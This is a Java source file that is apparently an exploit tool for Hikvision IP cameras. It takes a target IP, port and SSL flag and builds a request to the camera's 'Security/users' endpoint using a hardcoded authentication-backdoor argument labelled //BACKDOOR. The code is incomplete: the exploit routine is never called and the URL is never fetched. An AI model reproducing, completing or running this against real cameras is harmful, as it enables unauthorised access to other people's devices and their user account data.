package HIKVISIONIPCAMEXPLOIT;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class mainClass {
	static String BackdoorAuthArg = "auth=YWRtaW46MTEK"; //BACKDOOR
	static String ip = "";
	static int port = 0;
	static String SSL = "";
	static String userID = "";
	static String userName = "";
	public static Pattern p = Pattern.compile("^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
	static String protocol = "";
	public static void main(String args[]) {
		try {
			ip = args[0];
			
			port = Integer.parseInt(args[1]) ;
			
			SSL = args[2];
			 Matcher m = p.matcher(ip);
			 if(m.matches()) {
				if((port < 65535)) {
					
					
					
				}else{
					System.out.println("The entered port address" + port + " is not A valid port.");
				}
				 
				 
				 
			 }else {
				 System.out.println("The entered ip address" + ip + " is not in the correct format.");
				 System.exit(0);
			 }
		}catch(Exception e) {
			System.out.println("Bad arguments!");
			System.exit(0);
		}
	}
	public static void runExploit() {
		if(SSL.equals("Y")) {
			protocol = "https://";
		}else {
			protocol = "http://";
		}
		String URLBase = protocol + ip + ":" + port + "/";
		String URLDownload = URLBase + "Security/users?" + BackdoorAuthArg;
	}
	public static String DownloadWebPage(String urlIP) 
    { 
        try { 
  
            // Create URL object 
            URL url = new URL(urlIP); 
            BufferedReader readr =  new BufferedReader(new InputStreamReader(url.openStream())); 
//T
            
            String tmp; 
            String line = "";
            while ((tmp = readr.readLine()) != null) { 
            	line +=tmp;
            } 
            readr.close(); 
           return line;
        } catch (Exception e) { 
            System.out.println("Malformed URL Exception raised"); 
            return "";
        } 
        
    } 
}
